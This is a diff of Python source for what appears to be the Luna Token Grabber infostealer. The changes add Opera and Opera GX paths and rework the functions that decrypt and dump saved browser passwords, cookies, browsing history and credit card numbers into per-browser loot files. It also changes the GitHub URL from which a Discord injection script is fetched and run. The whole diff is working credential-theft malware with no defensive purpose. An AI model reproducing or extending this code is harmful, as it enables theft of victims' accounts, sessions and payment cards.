@@ -509,6 +509,8 @@ class Browsers:
             'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
             'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
             'iridium': self.appdata + '\\Iridium\\User Data',
+            'opera': self.roaming + '\\Opera Software\\Opera Stable',
+            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
         }
 
         self.profiles = [
@@ -562,82 +564,84 @@ class Browsers:
         return decrypted_pass
 
     def passwords(self, name: str, path: str, profile: str):
-        path += '\\' + profile + '\\Login Data'
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\Login Data'
+        else:
+            path += '\\' + profile + '\\Login Data'
         if not os.path.isfile(path):
             return
-
-        loginvault = create_temp()
-        copy2(path, loginvault)
-        conn = sqlite3.connect(loginvault)
-        cursor = conn.cursor()
-        with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
-                url, username, password = res
-                password = self.decrypt_password(password, self.masterkey)
-                if url != "":
-                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
-        cursor.close()
-        conn.close()
-        os.remove(loginvault)
+        connection = sqlite3.connect(path)
+        with connection:
+            cursor = connection.cursor()
+            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+            for results in cursor.fetchall():
+                url = results[0]
+                login = results[1]
+                password = self.decrypt_password(results[2], self.masterkey)
+                subfolder = os.path.join(tempfolder, "Browser", name)
+                os.makedirs(subfolder, exist_ok=True)
+                with open(os.path.join(subfolder, "passwords.txt"), "a", encoding="utf-8") as f:
+                    f.write(f"{url}:{login}:{password}\n")
 
     def cookies(self, name: str, path: str, profile: str):
-        path += '\\' + profile + '\\Network\\Cookies'
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\Network\\Cookies'
+        else:
+            path += '\\' + profile + '\\Network\\Cookies'
         if not os.path.isfile(path):
             return
         cookievault = create_temp()
         copy2(path, cookievault)
         conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
-        with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+        subfolder = os.path.join(tempfolder, "Browser", name)
+        os.makedirs(subfolder, exist_ok=True)
+        with open(os.path.join(subfolder, "cookies.txt"), 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
                 if host_key and name and value != "":
-                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
-                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
+                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
         cursor.close()
         conn.close()
         os.remove(cookievault)
 
     def history(self, name: str, path: str, profile: str):
-        path += '\\' + profile + '\\History'
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\History'
+        else:
+            path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
-        historyvault = create_temp()
-        copy2(path, historyvault)
-        conn = sqlite3.connect(historyvault)
+        conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        with open(os.path.join(tempfolder, "Browser", "Browser History.txt"), 'a', encoding="utf-8") as f:
-            sites = []
+        subfolder = os.path.join(tempfolder, "Browser", name)
+        os.makedirs(subfolder, exist_ok=True)
+        with open(os.path.join(subfolder, "history.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                 url, title, visit_count, last_visit_time = res
-                if url and title and visit_count and last_visit_time != "":
-                    sites.append((url, title, visit_count, last_visit_time))
-            sites.sort(key=lambda x: x[3], reverse=True)
-            for site in sites:
-                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
+                f.write(f"{url}\t{title}\t{visit_count}\t{last_visit_time}\n")
         cursor.close()
         conn.close()
-        os.remove(historyvault)
 
     def credit_cards(self, name: str, path: str, profile: str):
-        path += '\\' + profile + '\\Web Data'
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\Web Data'
+        else:
+            path += '\\' + profile + '\\Web Data'
         if not os.path.isfile(path):
             return
-        cardvault = create_temp()
-        copy2(path, cardvault)
-        conn = sqlite3.connect(cardvault)
+        conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        with open(os.path.join(tempfolder, "Browser", "Browser Creditcards.txt"), 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
-                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
-                if name_on_card and card_number_encrypted != "":
-                    f.write(
-                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.decrypt_password(card_number_encrypted, self.masterkey)}\n")
-        f.close()
+        subfolder = os.path.join(tempfolder, "Browser", name)
+        os.makedirs(subfolder, exist_ok=True)
+        with open(os.path.join(subfolder, "cc.txt"), 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards").fetchall():
+                name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified = res
+                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
+                f.write(f"{name_on_card}\t{expiration_month}\t{expiration_year}\t{card_number}\t{date_modified}\n")
         cursor.close()
         conn.close()
-        os.remove(cardvault)
 
     def roblox_cookies(self):
         global robo_cookie
@@ -769,7 +773,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get("https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js").text
+        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
